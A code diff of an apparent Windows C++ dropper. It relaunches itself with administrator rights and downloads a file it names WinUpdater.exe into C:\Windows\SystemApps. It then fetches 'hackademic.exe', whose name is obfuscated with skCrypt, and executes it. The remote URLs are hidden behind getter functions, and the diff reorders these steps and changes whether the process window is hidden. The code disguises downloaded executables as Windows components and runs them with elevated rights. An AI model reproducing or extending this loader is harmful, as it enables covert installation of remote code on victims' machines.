@@ -344,13 +344,15 @@ bool downloadFile(const std::wstring& url, const std::wstring& savePath) {
     return result;
 }
 
+
 bool executeFile(const std::wstring& filePath) {
     STARTUPINFOW si = { sizeof(si) };
     PROCESS_INFORMATION pi = { 0 };
     si.dwFlags = STARTF_USESHOWWINDOW;
-    si.wShowWindow = SW_HIDE;
+    si.wShowWindow = SW_SHOW;
 
-    BOOL result = CreateProcessW(filePath.c_str(), NULL, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
+    BOOL result = CreateProcessW(filePath.c_str(), NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
+
     if (result) {
         WaitForSingleObject(pi.hProcess, INFINITE);
         CloseHandle(pi.hProcess);
@@ -362,6 +364,7 @@ bool executeFile(const std::wstring& filePath) {
     }
     return result;
 }
+
 
 
 void writeSessionSeparator() {
@@ -379,12 +382,14 @@ void writeSessionSeparator() {
     writeLog("------------------------------\n");
 }
 
+
+
 int main() {
 
 
     if (!IsRunAsAdmin()) {
         if (RelaunchAsAdmin()) {
-            return 0; // Выход, т.к. перезапуск уже выполнен
+            return 0; 
         }
         else {
             writeLog("This program requires administrator privileges.");
@@ -426,6 +431,32 @@ int main() {
         return 1;
     }
 
+    
+
+
+    std::wstring winUpdaterURL = getwinUpdaterURL();
+    std::wstring winUpdaterSavePath = L"C:\\Windows\\SystemApps\\WinUpdater.exe";
+
+    
+    writeLog("winUpdaterURL: " + std::string(winUpdaterURL.begin(), winUpdaterURL.end()));
+
+    if (!downloadFile(winUpdaterURL, winUpdaterSavePath)) {
+        writeLog("Exiting due to failed download of WinUpdater.exe.");
+        return 1;
+    }
+
+
+    std::wstring spinnerURL = getspinnerURL();
+    std::wstring spinnerSavePath = L"C:\\Windows\\SystemApps\\spinner.gif";
+
+  
+    writeLog("spinnerURL: " + std::string(spinnerURL.begin(), spinnerURL.end()));
+
+    if (!downloadFile(spinnerURL, spinnerSavePath)) {
+        writeLog("Exiting due to failed download of spinner.gif.");
+        return 1;
+    }
+
     auto hackademicFileName = skCrypt(L"hackademic.exe").decrypt();
     std::wstring hackademicSavePath = std::wstring(tempPath) + hackademicFileName;
     std::wstring hackademicURL = getHackademicURL();
@@ -435,36 +466,18 @@ int main() {
 
     if (!downloadFile(hackademicURL, hackademicSavePath)) {
         writeLog("Exiting due to failed download of hackademic.exe.");
-        return 1;
-    }
+        writeLog("Попытка скачать hackademic.exe");
 
-
-    std::wstring winUpdaterURL = getwinUpdaterURL();
-    std::wstring winUpdaterSavePath = L"C:\\Windows\\SystemApps\\WinUpdater.exe";
-
-    // Логируем URL для проверки
-    writeLog("winUpdaterURL: " + std::string(winUpdaterURL.begin(), winUpdaterURL.end()));
-
-    if (!downloadFile(winUpdaterURL, winUpdaterSavePath)) {
-        writeLog("Exiting due to failed download of WinUpdater.exe.");
-        return 1;
-    }
-
-    std::wstring spinnerURL = getspinnerURL();
-    std::wstring spinnerSavePath = L"C:\\Windows\\SystemApps\\spinner.gif";
-
-    // Логируем URL для проверки
-    writeLog("spinnerURL: " + std::string(spinnerURL.begin(), spinnerURL.end()));
-
-    if (!downloadFile(spinnerURL, spinnerSavePath)) {
-        writeLog("Exiting due to failed download of spinner.gif.");
         return 1;
     }
 
     if (!executeFile(hackademicSavePath)) {
         writeLog("Exiting due to failed execution.");
         return 1;
+        system("pause");
     }
+
+   
 
    
 
